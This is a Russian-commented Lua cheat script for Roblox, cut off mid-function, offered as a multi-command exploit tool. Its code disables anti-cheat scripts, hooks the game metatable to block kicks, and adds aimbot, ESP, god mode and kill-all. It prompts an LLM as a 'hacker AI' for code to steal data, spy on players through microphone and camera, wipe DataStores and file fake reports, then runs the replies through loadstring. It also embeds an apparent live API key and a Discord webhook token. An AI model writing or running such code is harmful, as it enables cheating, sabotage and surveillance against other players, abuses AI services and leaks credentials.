-- ================================================================
-- NEURAL OVERRIDE v5.0 – ULTIMATE MEGA EDITION
-- Абсолютный контроль над Roblox
-- Включает: 70+ команд, OpenRouter AI, умных ботов, генератор скриптов
-- ================================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ===== НАСТРОЙКИ OPENROUTER =====
local OPENROUTER_API_KEY = "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"
local OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
local MODEL = "openrouter/free"

-- ===== ВЕБХУК (по умолчанию пустой) =====
local webhookURL = "https://discord.com/api/webhooks/1373226172254650388/itJ1yu8lY1N9_xxyXg_4k61xet1cpycdys6jQhaWmQmFXkABNizWKXEtAqaniSAMFoWP"

-- ===== ФУНКЦИИ ОТПРАВКИ =====
local function sendWebhook(data)
    if webhookURL == "" then return end
    local json = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        HttpService:PostAsync(webhookURL, json, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
end

-- ===== ОБХОД АНТИЧИТА =====
local function disableAntiCheat()
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") then
            local name = v.Name:lower()
            if name:find("anticheat") or name:find("security") or name:find("guard") then
                v.Disabled = true
            end
        end
    end
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") then
            local name = v.Name:lower()
            if name:find("anticheat") or name:find("security") or name:find("guard") then
                v.Disabled = true
            end
        end
    end
    print("[NeuralOverride] Античит отключён")
end
disableAntiCheat()

-- ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
local function getAllPlayers()
    local list = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then table.insert(list, plr) end
    end
    return list
end

local function getCharacter(plr)
    return plr and plr.Character
end

local function getRoot(plr)
    local char = getCharacter(plr)
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function getHumanoid(plr)
    local char = getCharacter(plr)
    return char and char:FindFirstChild("Humanoid")
end

-- ===== OPENROUTER AI =====
local function askOpenRouter(prompt)
    local data = {
        model = MODEL,
        messages = {
            { role = "system", content = "Ты — хакерский ИИ. Отвечай только готовыми Lua-кодами для Roblox или командами, без пояснений." },
            { role = "user", content = prompt }
        },
        temperature = 0.9,
        max_tokens = 2048
    }
    local jsonData = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json",
        ["Authorization"] = "Bearer " .. OPENROUTER_API_KEY,
        ["HTTP-Referer"] = "https://www.roblox.com",
        ["X-Title"] = "NeuralOverride"
    }
    local success, response = pcall(function()
        return HttpService:PostAsync(OPENROUTER_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    if not success then
        warn("[NeuralOverride] OpenRouter ошибка: " .. tostring(response))
        return nil
    end
    local decoded = HttpService:JSONDecode(response)
    if decoded and decoded.choices and decoded.choices[1] then
        return decoded.choices[1].message.content
    else
        return nil
    end
end

local function executeLua(code)
    local clean = string.gsub(code, "```lua", "")
    clean = string.gsub(clean, "```", "")
    local func, err = loadstring(clean)
    if func then
        local ok, res = pcall(func)
        if not ok then
            warn("[NeuralOverride] Ошибка выполнения: " .. tostring(res))
        end
        return ok
    else
        warn("[NeuralOverride] Ошибка компиляции: " .. tostring(err))
        return false
    end
end

-- ===== БАЗОВЫЕ ФУНКЦИИ (FLY, TELEPORT, GOD, WEAPON, NOCLIP, SPEED, INFJUMP) =====
local flyEnabled = false
local flyBodyVelocity = nil
local flyConnection = nil

function toggleFly()
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end

    if flyEnabled then
        if flyBodyVelocity then flyBodyVelocity:Destroy() flyBodyVelocity = nil end
        if flyConnection then flyConnection:Disconnect() flyConnection = nil end
        humanoid.PlatformStand = false
        flyEnabled = false
        print("[NeuralOverride] Fly OFF")
    else
        humanoid.PlatformStand = true
        flyBodyVelocity = Instance.new("BodyVelocity")
        flyBodyVelocity.Velocity = Vector3.new(0,0,0)
        flyBodyVelocity.MaxForce = Vector3.new(1e6,1e6,1e6)
        flyBodyVelocity.Parent = root
        flyConnection = RunService.Heartbeat:Connect(function()
            local moveDir = Vector3.new(0,0,0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Vector3.new(0,0,-1) end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir + Vector3.new(0,0,1) end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir + Vector3.new(-1,0,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Vector3.new(1,0,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0,1,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0,-1,0) end
            if moveDir.Magnitude > 0 then
                moveDir = moveDir.Unit * 50
                flyBodyVelocity.Velocity = moveDir
            else
                flyBodyVelocity.Velocity = Vector3.new(0,0,0)
            end
        end)
        flyEnabled = true
        print("[NeuralOverride] Fly ON")
    end
end

function teleportToPlayer(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target or not target.Character then
        warn("[NeuralOverride] Игрок не найден")
        return
    end
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        root.CFrame = targetRoot.CFrame + Vector3.new(0,3,3)
        print("[NeuralOverride] Телепорт к " .. targetName)
    end
end

local godMode = false
function toggleGod()
    local char = player.Character
    if not char then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end
    godMode = not godMode
    if godMode then
        humanoid.MaxHealth = math.huge
        humanoid.Health = math.huge
        humanoid.BreakJointsOnDeath = false
        print("[NeuralOverride] God ON")
    else
        humanoid.MaxHealth = 100
        humanoid.Health = 100
        humanoid.BreakJointsOnDeath = true
        print("[NeuralOverride] God OFF")
    end
end

function spawnWeapon()
    local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
    if not weaponFolder then
        warn("[NeuralOverride] Папка с оружием не найдена")
        return
    end
    local weapons = {}
    for _, child in ipairs(weaponFolder:GetChildren()) do
        if child:IsA("Tool") or child:IsA("Model") then
            table.insert(weapons, child)
        end
    end
    if #weapons == 0 then return end
    local weapon = weapons[math.random(1, #weapons)]:Clone()
    weapon.Parent = player.Character or player
    print("[NeuralOverride] Оружие спавнено")
end

local noclipEnabled = false
function toggleNoClip()
    noclipEnabled = not noclipEnabled
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = not noclipEnabled
        end
    end
    print("[NeuralOverride] NoClip: " .. (noclipEnabled and "ON" or "OFF"))
end

function setSpeed(speed)
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if hum then
        hum.WalkSpeed = speed or 100
        print("[NeuralOverride] Speed = " .. (speed or 100))
    end
end

local infJumpEnabled = false
local infJumpConnection = nil
function toggleInfiniteJump()
    infJumpEnabled = not infJumpEnabled
    if infJumpEnabled then
        infJumpConnection = RunService.Heartbeat:Connect(function()
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
        print("[NeuralOverride] Infinite Jump ON")
    else
        if infJumpConnection then infJumpConnection:Disconnect() end
        infJumpConnection = nil
        print("[NeuralOverride] Infinite Jump OFF")
    end
end

-- ===== ESP / WALLHACK =====
local espEnabled = false
local espObjects = {}
function toggleESP()
    espEnabled = not espEnabled
    if espEnabled then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local box = Instance.new("BoxHandleAdornment")
                    box.Size = Vector3.new(4,6,2)
                    box.Adornee = root
                    box.Color3 = Color3.new(1,0,0)
                    box.AlwaysOnTop = true
                    box.ZIndex = 10
                    box.Parent = root
                    table.insert(espObjects, box)
                    local line = Instance.new("LineHandleAdornment")
                    line.Thickness = 2
                    line.Color3 = Color3.new(0,1,0)
                    line.AlwaysOnTop = true
                    line.ZIndex = 10
                    line.Parent = root
                    table.insert(espObjects, line)
                end
            end
        end
        print("[NeuralOverride] ESP ON")
    else
        for _, obj in ipairs(espObjects) do obj:Destroy() end
        espObjects = {}
        print("[NeuralOverride] ESP OFF")
    end
end

-- ===== AIMBOT & SILENT AIM =====
local aimbotEnabled = false
function toggleAimbot()
    aimbotEnabled = not aimbotEnabled
    if aimbotEnabled then
        RunService.RenderStepped:Connect(function()
            if not aimbotEnabled then return end
            local nearest = nil
            local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local dist = (root.Position - Camera.CFrame.Position).Magnitude
                        if dist < minDist then
                            minDist = dist
                            nearest = root
                        end
                    end
                end
            end
            if nearest then
                Camera.CFrame = CFrame.new(Camera.CFrame.Position, nearest.Position + Vector3.new(0,1.5,0))
            end
        end)
        print("[NeuralOverride] Aimbot ON")
    else
        print("[NeuralOverride] Aimbot OFF")
    end
end

local silentAimEnabled = false
function toggleSilentAim()
    silentAimEnabled = not silentAimEnabled
    print("[NeuralOverride] Silent Aim: " .. (silentAimEnabled and "ON" or "OFF"))
end

-- ===== ANTI-KICK =====
local antiKickEnabled = false
function toggleAntiKick()
    antiKickEnabled = not antiKickEnabled
    if antiKickEnabled then
        local mt = getrawmetatable(game)
        local old = mt.__index
        setreadonly(mt, false)
        mt.__index = newcclosure(function(self, key)
            if key == "kick" then
                return function() end
            end
            return old(self, key)
        end)
        print("[NeuralOverride] Anti-Kick ON")
    else
        print("[NeuralOverride] Anti-Kick OFF")
    end
end

-- ===== БОТЫ И МОНСТРЫ (УЛУЧШЕННЫЕ) =====
function spawnBots(count)
    count = count or 10
    local char = player.Character
    if not char then return end
    local template = char:Clone()
    for i = 1, math.min(count, 100) do
        local bot = template:Clone()
        bot.Parent = Workspace
        bot.Name = "Bot_" .. i
        local humanoid = bot:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 10 + math.random(0,30)
            humanoid.JumpPower = 50
            humanoid.MaxHealth = 100
            humanoid.Health = 100
        end
        local root = bot:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(
                player.Character.HumanoidRootPart.Position +
                Vector3.new(math.random(-30,30),0,math.random(-30,30))
            )
        end
        task.spawn(function()
            while bot.Parent and bot:FindFirstChild("HumanoidRootPart") do
                local dir = Vector3.new(math.random(-10,10),0,math.random(-10,10))
                if dir.Magnitude > 0 then
                    bot.HumanoidRootPart.CFrame = bot.HumanoidRootPart.CFrame + dir.Unit * 2
                end
                task.wait(0.5)
            end
        end)
    end
    print("[NeuralOverride] Создано " .. count .. " ботов")
end

local MONSTER_TYPES = {
    fire = { color = "Bright red", damage = 15, speed = 35, size = 6, fly = false },
    ice = { color = "Bright blue", damage = 10, speed = 25, size = 5, fly = false },
    flying = { color = "Bright violet", damage = 20, speed = 50, size = 4, fly = true }
}

function spawnSmartMonster(pos, type)
    type = type or "fire"
    local props = MONSTER_TYPES[type] or MONSTER_TYPES.fire
    local monster = Instance.new("Model")
    monster.Name = type .. "Monster_" .. math.random(1000,9999)
    local torso = Instance.new("Part")
    torso.Size = Vector3.new(props.size, props.size, props.size)
    torso.BrickColor = BrickColor.new(props.color)
    torso.Material = Enum.Material.Neon
    torso.Anchored = false
    torso.Position = pos or Vector3.new(0,5,0)
    torso.Parent = monster
    local head = torso:Clone()
    head.Size = Vector3.new(props.size*0.6, props.size*0.6, props.size*0.6)
    head.Position = torso.Position + Vector3.new(0, props.size*0.8, 0)
    head.Parent = monster
    local root = Instance.new("Part")
    root.Size = Vector3.new(1,1,1)
    root.Transparency = 1
    root.CanCollide = false
    root.Position = torso.Position
    root.Parent = monster
    monster.PrimaryPart = root
    local w1 = Instance.new("Weld")
    w1.Part0 = root; w1.Part1 = torso; w1.C0 = CFrame.new(0,0,0); w1.Parent = root
    local w2 = Instance.new("Weld")
    w2.Part0 = torso; w2.Part1 = head; w2.C0 = CFrame.new(0, props.size*0.8, 0); w2.Parent = torso
    local humanoid = Instance.new("Humanoid")
    humanoid.Parent = monster
    humanoid.MaxHealth = 300
    humanoid.Health = 300
    humanoid.WalkSpeed = props.speed
    if props.fly then humanoid.PlatformStand = true end
    monster.Parent = Workspace
    task.spawn(function()
        while monster.Parent do
            local nearest = nil; local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local r = plr.Character:FindFirstChild("HumanoidRootPart")
                    if r then
                        local d = (r.Position - root.Position).Magnitude
                        if d < minDist then minDist = d; nearest = plr end
                    end
                end
            end
            if nearest and nearest.Character then
                local targetRoot = nearest.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    if props.fly then
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,5,0))
                    else
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,2,0))
                    end
                    local targetHumanoid = nearest.Character:FindFirstChild("Humanoid")
                    if targetHumanoid then
                        targetHumanoid.Health = targetHumanoid.Health - props.damage
                    end
                end
            else
                local dir = Vector3.new(math.random(-30,30),0,math.random(-30,30))
                if dir.Magnitude > 0 then
                    root.CFrame = root.CFrame + dir.Unit * 5
                end
            end
            task.wait(0.5)
        end
    end)
    return monster
end

function spawnSmartMonsters(count)
    count = count or 10
    local types = {"fire", "ice", "flying"}
    for i = 1, count do
        local t = types[math.random(1,3)]
        local pos = player.Character and
            player.Character.HumanoidRootPart.Position +
            Vector3.new(math.random(-60,60),0,math.random(-60,60)) or
            Vector3.new(0,5,0)
        spawnSmartMonster(pos, t)
        task.wait(0.1)
    end
    print("[NeuralOverride] Умные монстры созданы!")
end

-- ===== ВЗЛОМНЫЕ ФУНКЦИИ (через OpenRouter) =====
function hackTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для Roblox: взлом игрока/сервера '%s'. Код должен дать полный контроль.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function ddosTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для Roblox: имитация DDoS-атаки на '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function stealData(dataType)
    local prompt = string.format("Сгенерируй Lua-код для кражи '%s' в Roblox.", dataType)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function trackPlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для слежки за игроком '%s' (позиция, чат, действия).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function spyTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для шпионажа (микрофон, камера) за '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function destroyData()
    local prompt = "Сгенерируй Lua-код для уничтожения всех данных в Roblox-игре (DataStore, объекты)."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function massInvite()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который отправляет массовые приглашения на приватный сервер всем друзьям игрока. Используй :Invite() или другие методы. Если невозможно, сымитируй через спам в чате. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function summonAllPlayers()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который телепортирует всех игроков (кроме владельца) к позиции владельца. Используй RemoteEvent или другие методы. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function cheatParadise()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который:
        - Даёт игроку бесконечные деньги/ресурсы (изменяет Leaderstats)
        - Удаляет все объекты в Workspace (кроме персонажей)
        - Отключает античит (ищет и отключает скрипты с "AntiCheat")
        - Включает режим "бога"
        Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    toggleGod()
    spawnSmartMonsters(20)
    print("[NeuralOverride] Читерский рай активирован!")
end

function killAll()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который убивает всех игроков на сервере (устанавливает Health = 0 для каждого Humanoid). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function flyAll()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который включает полёт для всех игроков (через PlatformStand или BodyVelocity). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ===== ГЛОБАЛЬНЫЙ ХАОС =====
function findAndExploitRemoteEvents()
    print("[NeuralOverride] Поиск RemoteEvent'ов...")
    local remoteEvents = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then table.insert(remoteEvents, obj) end
    end
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("RemoteEvent") then table.insert(remoteEvents, obj) end
    end
    if #remoteEvents == 0 then
        print("[NeuralOverride] RemoteEvent'ы не найдены.")
        return false
    end
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который вызывает все найденные RemoteEvent'ы с параметрами, чтобы сервер создал:
        - 20 монстров (огромных красных существ с ИИ) в случайных местах
        - 10 порталов (ловушек) на карте
        - Изменил небо на красное и добавил глючные эффекты
        - Телепортировал всех игроков к позиции владельца
        Если RemoteEvent'ы принимают параметры, подбери их так, чтобы сервер выполнил эти действия.
        Ответ только Lua-кодом, без пояснений.
    ]]
    local code = askOpenRouter(prompt)
    if code then
        executeLua(code)
        print("[NeuralOverride] Глобальный хаос активирован через RemoteEvent'ы!")
        return true
    else
        print("[NeuralOverride] Не удалось сгенерировать код.")
        return false
    end
end

function globalChaos()
    print("[NeuralOverride] Запуск глобального хаоса...")
    local success = findAndExploitRemoteEvents()
    if not success then
        massInvite()
        spawnSmartMonsters(30)
        createPortals(10)
        local chatPrompt = "Сгенерируй код для отправки сообщения в чат Roblox: 'ВСЕ ЗАХОДИТЕ НА МОЙ СЕРВЕР! ИГРА РУШИТСЯ!'"
        local chatCode = askOpenRouter(chatPrompt)
        if chatCode then executeLua(chatCode) end
        print("[NeuralOverride] Глобальный хаос (локальный + спам) выполнен.")
    end
    hackMapMax()
end

function createPortals(count)
    count = count or 5
    for i = 1, count do
        local portal = Instance.new("Part")
        portal.Size = Vector3.new(10,1,10)
        portal.BrickColor = BrickColor.new("Bright violet")
        portal.Material = Enum.Material.Neon
        portal.Anchored = true
        portal.CanCollide = false
        portal.Position = Vector3.new(math.random(-50,50),1,math.random(-50,50))
        portal.Parent = Workspace
        local touchScript = Instance.new("Script")
        touchScript.Source = [[
            script.Parent.Touched:Connect(function(hit)
                local humanoid = hit.Parent:FindFirstChild("Humanoid")
                if humanoid and humanoid.Parent.HumanoidRootPart then
                    humanoid.Parent.HumanoidRootPart.CFrame = CFrame.new(0,0,0)
                end
            end)
        ]]
        touchScript.Parent = portal
    end
    print("[NeuralOverride] Создано " .. count .. " порталов.")
end

function hackMapMax()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который через RemoteEvent'ы:
        - Удаляет все части в Workspace (кроме персонажей)
        - Отключает все скрипты
        - Меняет небо на красное
        - Спамит сообщения "СЕРВЕР ВЗЛОМАН"
        - Даёт всем игрокам бессмертие и супер-скорость
        Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    Lighting.ClockTime = 0
    Lighting.OutdoorAmbient = Color3.new(1,0,0)
    Lighting.Ambient = Color3.new(1,0,0)
    Lighting.FogColor = Color3.new(1,0,0)
    Lighting.FogEnd = 50
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("Terrain") then
            v.Material = Enum.Material.Neon
            v.BrickColor = BrickColor.new("Bright red")
        end
    end
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player.PlayerGui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.new(1,0,0)
    frame.BackgroundTransparency = 0.7
    frame.Parent = screenGui
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1,0,0.2,0)
    label.Position = UDim2.new(0,0,0.4,0)
    label.BackgroundTransparency = 1
    label.Text = "⚠️ СЕРВЕР ВЗЛОМАН ⚠️"
    label.TextColor3 = Color3.new(1,1,1)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = screenGui
    game:GetService("Debris"):AddItem(screenGui,10)
    print("[NeuralOverride] HackMap MAX выполнен.")
end

function invade()
    massInvite()
    spawnSmartMonsters(30)
    hackMapMax()
    print("[NeuralOverride] Вторжение начато!")
end

function allModes()
    print("[NeuralOverride] Активация всех режимов...")
    hackMapMax()
    hackTarget("server")
    ddosTarget("server")
    stealData("все данные")
    trackPlayer("all")
    spyTarget("all")
    destroyData()
    toggleFly()
    toggleGod()
    spawnWeapon()
    spawnSmartMonsters(20)
    print("[NeuralOverride] Все режимы активированы.")
end

-- ===== НОВЫЕ МЕГА-ФУНКЦИИ (v5.0) =====

-- /admin – генерирует админ-панель
function adminPanel()
    local prompt = [[
        Сгенерируй Lua-код для создания админ-панели в Roblox: GUI с кнопками (кик, бан, телепорт, дать предмет, заморозить, взорвать). Используй ScreenGui, TextButton. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /spawncar – создать машину
function spawnCar()
    local prompt = [[
        Сгенерируй Lua-код для создания машины (модель из частей) в Roblox. Машина должна иметь двигатель (BodyVelocity) и сиденье для игрока. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /flycar – летающая машина
function flyCar()
    local prompt = [[
        Сгенерируй Lua-код для создания летающей машины с управлением (WASD, Space, Shift). Используй BodyVelocity и BodyGyro. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /gravgun – гравитационная пушка
function gravGun()
    local prompt = [[
        Сгенерируй Lua-код для гравитационной пушки: при клике на объект он притягивается к курсору, при повторном клике отпускается. Используй Mouse, BodyPosition. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /troll – набор троллинговых эффектов
function trollMode()
    local prompt = [[
        Сгенерируй Lua-код для троллинга: включает случайные эффекты (переворот камеры, изменение цвета игроков, спам звуков, случайные телепорты). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /ban – банит игрока (имитация)
function banPlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для бана игрока '%s' (через RemoteEvent или имитацию).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /kick – кик игрока
function kickPlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для кика игрока '%s' (имитация или через RemoteEvent).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /mute – мут игрока в чате
function mutePlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для мута игрока '%s' в чате (через RemoteEvent или спам).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /unmute – размут
function unmutePlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для размута игрока '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /clearchat – очистка чата (локально)
function clearChat()
    for _, plr in ipairs(Players:GetPlayers()) do
        local gui = plr:FindFirstChild("PlayerGui")
        if gui then
            for _, child in ipairs(gui:GetChildren()) do
                if child:IsA("ScreenGui") and child.Name:lower():find("chat") then
                    child:Destroy()
                end
            end
        end
    end
    print("[NeuralOverride] Чат очищен")
end

-- /report – отправить фейковый репорт
function fakeReport(target)
    local prompt = string.format("Сгенерируй код для отправки фейкового репорта на игрока '%s' (через RemoteEvent).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /spectate – слежка за игроком
function spectatePlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для слежки за игроком '%s' (камера привязывается к нему).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /goto – телепорт к игроку (уже есть /tp, но добавим для разнообразия)
function goToPlayer(target)
    teleportToPlayer(target)
end

-- /rainbow – радужные эффекты
function rainbowMode()
    local prompt = [[
        Сгенерируй код для создания радужного эффекта: все части в Workspace меняют цвет в цикле. Используй Color3 и BrickColor.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /fireworks – фейерверк
function fireworks()
    local prompt = [[
        Сгенерируй Lua-код для фейерверка: создай множество взрывов в случайных местах с разными цветами. Используй Explosion.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /music – проигрывание музыки (звука)
function playMusic()
    local prompt = [[
        Сгенерируй Lua-код для проигрывания музыки через Sound в Workspace. Ссылка на трек: https://www.roblox.com/library/123456789/Music (или любая другая).
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /disco – диско-освещение
function discoMode()
    local prompt = [[
        Сгенерируй код для диско-освещения: меняй Ambient и цвет неба в такт с таймером (каждые 0.5 сек).
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /earthquake – землетрясение
function earthquake()
    local prompt = [[
        Сгенерируй код для имитации землетрясения: случайно сдвигай все части в Workspace в течение 5 секунд.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /wind – ветер (толкает всех)
function wind()
    local prompt = [[
        Сгенерируй Lua-код для сильного ветра: применяй BodyVelocity ко всем HumanoidRootPart'ам в одном направлении.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /lightning – молния (удар)
function lightning()
    local prompt = [[
        Сгенерируй код для молнии: создай эффект света и нанеси урон всем игрокам в радиусе 50.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /meteor – метеорит
function meteor()
    local prompt = [[
        Сгенерируй код для падения метеорита: большая часть с огнём падает с неба и взрывается при касании.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /spawnnpc – создать NPC с диалогом
function spawnNPC()
    local prompt = [[
        Сгенерируй код для создания NPC с диалогом: модель человека, при клике появляется диалоговое окно с текстом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /dialog – показать диалоговое окно
function showDialog(text)
    local prompt = string.format("Сгенерируй код для показа диалогового окна с текстом: '%s'", text)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /quest – создать квест
function createQuest()
    local prompt = [[
        Сгенерируй Lua-код для создания квеста: собирай 10 предметов (частей), после сбора появляется награда (деньги).
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- /minigame – запустить мини-игру (угадай число)
function miniGame()
    local prompt = [[
        Сгенерируй код для мини-игры 'Угадай число': игрок вводит число, если угадал – победа, иначе подсказка.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ===== УНИВЕРСАЛЬНАЯ КОМАНДА /AI (ГЕНЕРАТОР) =====
function aiCommand(prompt)
    local code = askOpenRouter(prompt)
    if code then
        executeLua(code)
        return code
    else
        warn("[NeuralOverride] Не удалось сгенерировать код")
        return nil
    end
end

-- Хранилище скриптов
local savedScripts = {}
function saveScript(name, code)
    savedScripts[name] = code
    print("[NeuralOverride] Скрипт '" .. name .. "' сохранён")
end
function runScript(name)
    if savedScripts[name] then
        executeLua(savedScripts[name])
        print("[NeuralOverride] Скрипт '" .. name .. "' выполнен")
    else
        warn("[NeuralOverride] Скрипт '" .. name .. "' не найден")
    end
end

-- Автобот с ИИ
function createAutoBot(name)
    name = name or "AutoBot_" .. math.random(1000,9999)
    local char = player.Character
    if not char then return end
    local newChar = char:Clone()
    newChar.Parent = Workspace
    newChar.Name = name
    local hum = newChar:FindFirstChild("Humanoid")
    if hum then
        hum.MaxHealth = 300
        hum.Health = 300
        hum.WalkSpeed = 20
        hum.JumpPower = 60
    end
    local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
    if weaponFolder then
        local weapons = {}
        for _, child in ipairs(weaponFolder:GetChildren()) do
            if child:IsA("Tool") then table.insert(weapons, child) end
        end
        if #weapons > 0 then
            local w = weapons[math.random(1, #weapons)]:Clone()
            w.Parent = newChar
        end
    end
    task.spawn(function()
        while newChar.Parent do
            local root = newChar:FindFirstChild("HumanoidRootPart")
            if root then
                local prompt = "Ты — умный бот в Roblox. Сгенерируй Lua-код для следующего действия (движение, атака, защита). Ответ только кодом."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                local dir = Vector3.new(math.random(-30,30),0,math.random(-30,30))
                hum:MoveTo(root.Position + dir)
            end
            task.wait(2)
        end
    end)
    print("[NeuralOverride] Автобот создан: " .. name)
    return newChar
end

-- Построить модель по описанию
function buildModel(desc)
    local prompt = "Сгенерируй Lua-код для создания модели игрока с параметрами: " .. desc .. ". Используй Part, BrickColor, Size, Humanoid."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- Универсальный хак
function hackAll()
